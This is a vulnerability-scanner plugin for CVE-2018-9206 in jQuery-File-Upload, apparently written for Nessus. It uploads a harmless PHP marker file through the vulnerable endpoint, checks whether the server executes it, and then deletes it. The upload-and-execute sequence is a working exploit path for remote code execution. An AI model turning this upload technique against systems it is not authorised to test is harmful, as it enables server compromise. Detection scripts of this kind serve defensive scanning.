include("compat.inc");

if (description)
{
  script_id(51799018);
  script_version("1.3");
  script_cvs_date("Date: 2018/10/25 15:50:21");

  script_cve_id("CVE-2018-9206");

  script_name(english:"jQuery-File-Upload Arbitrary File Upload Vulnerability (Remote Check)");
  script_summary(english:"Attempts to upload a file and confirm a remote code execution vulnerability exists.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
a file upload vulnerability allowing remote code execution.");
  script_set_attribute(attribute:"description", value:
"The version of jQuery-File-Upload running on the remote host is
affected by an arbitrary file upload vulnerability. An unauthenticated
attacker could leverage this vulnerability to gain access to the host
in the context of the web application user.");
  script_set_attribute(attribute:"see_also", value:"https://github.com/blueimp/jQuery-File-Upload/");
  script_set_attribute(attribute:"see_also", value:"http://www.vapidlabs.com/advisory.php?v=204");
  script_set_attribute(attribute:"see_also", value:"https://github.com/lcashdol/Exploits/tree/master/CVE-2018-9206");
  # https://www.zdnet.com/article/zero-day-in-popular-jquery-plugin-actively-exploited-for-at-least-three-years/

  script_set_attribute(attribute:"solution", value:
"Upgrade to blueimp/jQuery-File-Upload version 9.22.1 or later.
Additionally if using a branch of this project, contact the branch
maintainer for a product security update.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2018-9206");

  script_set_attribute(attribute:"vuln_publication_date",value:"2018/10/11");
  script_set_attribute(attribute:"patch_publication_date",value:"2018/10/11");
  script_set_attribute(attribute:"plugin_publication_date", value:"2018/10/22");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"x-cpe:/a:jquery-file-upload:jquery-file-upload");
  script_set_attribute(attribute:"in_the_news", value:"true");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) WebRAY, Inc.");

  script_dependencies("webmirror3.nbin", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  script_exclude_keys("Settings/disable_cgi_scanning");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("json.inc");

port = get_http_port(default:80, php:TRUE);

urls =
  {
    "server/php/upload.class.php": "server/php/index.php",
    "jQuery-File-Upload/server/php/upload.class.php": "/jQuery-File-Upload/server/php/index.php",
    "example/upload.php": "example/upload.php",
    "jQuery-File-Upload/example/upload.php": "jQuery-File-Upload/example/upload.php",
    "server/php/UploadHandler.php": "server/php/index.php",
    "jQuery-File-Upload/server/php/UploadHandler.php": "jQuery-File-Upload/server/php/index.php",
    "php/index.php": "php/index.php",
    "jQuery-File-Upload/php/index.php": "jQuery-File-Upload/php/index.php"
  };

function http_del(url)
{
  res = http_send_recv3(
    method       : "DELETE",
    port         : port,
    item         : url
  );
  if (res && res[2])
    return [http_last_sent_request(), res[2]];
}

vuln = FALSE;
found = FALSE;

filename = "jqueryfileupload-" + rand_str(length:8) + ".php";
bound = rand_str(length:16, charset:"0123456789abcdef");
boundary = "--" + bound;
postdata =
  boundary + '\r\n' +
  'content-disposition: form-data; name="files"; filename="' + filename + '"\r\n' +
  'content-type: text/plain\r\n' +
  '\r\n' +
  '<?php echo "<html>' + substr(SCRIPT_NAME, 0, strlen(SCRIPT_NAME) - 2) + '"; echo "' + substr(SCRIPT_NAME, strlen(SCRIPT_NAME) - 1) + '</html>" ?>\r\n' +
  boundary + '--\r\n';

if (thorough_tests)
{
  curr_dir = get_kb_item_or_exit("www/" + port + "/content/directory_index");
}
else
{
  curr_dir = "/";
}

foreach url (keys(urls))
{
  # Check for the vulnerable script or required library
  res = http_send_recv3(
    method       : "HEAD",
    port         : port,
    item         : build_url(port:port, qs:curr_dir + url),
    exit_on_fail : TRUE
  );
  if ("200 OK" >< res[0])
  {

  # upload the php file
    res = http_send_recv3(
      method       : "POST",
      port         : port,
      item         : build_url(port:port, qs:curr_dir + urls[url]),
      add_headers  : {"Content-Type": "multipart/form-data; boundary=" + bound},
      data         : postdata,
      exit_on_fail : TRUE
    );

    if (res && res[2])
    {
      post_req = http_last_sent_request();
      post_res = res[2];
      json = json_read(res[2]);
    }
    else
    {
      audit(AUDIT_WEB_APP_NOT_AFFECTED, "jQuery-File-Upload", build_url(port:port, qs:curr_dir + urls[url]));
    }

    if (typeof(json) == "array" && json[0]['files'][0]['name'] && json[0]['files'][0]['url'] && json[0]['files'][0]['deleteUrl'])
    {
      filename2 = json[0]['files'][0]['name'];
      shellurl = json[0]['files'][0]['url'];
      delurl   = json[0]['files'][0]['deleteUrl'];
    }
    else if (typeof(json) == "array" && json[0]['0']['name'] && json[0]['0']['url'] && json[0]['0']['delete_url'])
    {
      filename2 = json[0]['0']['name'];
      shellurl = json[0]['0']['url'];
      delurl   = json[0]['0']['delete_url'];
    }
    else if (typeof(json) == "array" && json[0]['name'] && json[0]['url'] && json[0]['delete_url'])
    {
      filename2 = json[0]['name'];
      shellurl = json[0]['url'];
      delurl   = json[0]['delete_url'];
    }
    else if (typeof(json) == "array" && (json[0]['error'] || json[0]['0']['error'] || json[0]['files'][0]['error']))
      # correctly working script
      audit(AUDIT_WEB_APP_NOT_AFFECTED, "jQuery-File-Upload", build_url(port:port, qs:curr_dir + urls[url]));
    else
    {
      # Not sure what came back. try to do a delete if we got a 200 in case it worked anyway
      if ("200 OK" >< res[0])
        http_del(url:build_url(port:port, qs:curr_dir + urls[url]) + '?file=' + filename);
      audit(AUDIT_RESP_BAD, port, "POST " + curr_dir +urls[url]);
    }
    if (filename2 && shellurl && delurl)
    {
      # Did htaccess rewrite it?
      if (filename != filename2 && !pregmatch(pattern:".php$", string:filename2))
      {
        http_del(url:delurl);
        audit(AUDIT_WEB_APP_NOT_AFFECTED, "jQuery-File-Upload", build_url(port:port, qs:curr_dir + urls[url]));
      }
      vuln = TRUE;
    }
    found = TRUE;
    break;
  }
}
if (found && !vuln)
  audit(AUDIT_WEB_APP_NOT_AFFECTED, "jQuery-File-Upload", build_url(port:port, qs:curr_dir + urls[url]));

if (!found)
  audit(AUDIT_WEB_APP_NOT_INST, "jQuery-File-Upload", port);

# test the file
res = http_send_recv3(
  method       : "GET",
  port         : port,
  item         : shellurl
);

# this is a test to see if PHP is executing our upload
if (res && res[2] && SCRIPT_NAME >< res[2])
{
  shell_req = http_last_sent_request();
  shell_res = res[2];
}

# delete the file
out = http_del(url:delurl);
if (out)
{
  del_res = out[1];
  del_req = out[0];
}

if (vuln)
{
  # build request and output:
  request = [];
  output  = [];
  if (post_req)
  {
    request = make_list(request, '>>>>>\n' + post_req + '<<<<<\n' + post_res);
  }
  if (shell_req)
  {
    request = make_list(request, '>>>>>\n' + shell_req + '<<<<<\n' + shell_res);
  }
  if (del_req)
  {
    request = make_list(request, '>>>>>\n' + del_req + '<<<<<\n' + del_res);
  }

  security_report_v4(
    port        : port,
    severity    : SECURITY_HOLE,
    line_limit  : 20,
    request     : request,
    generic    : TRUE
  );
}
exit(0);
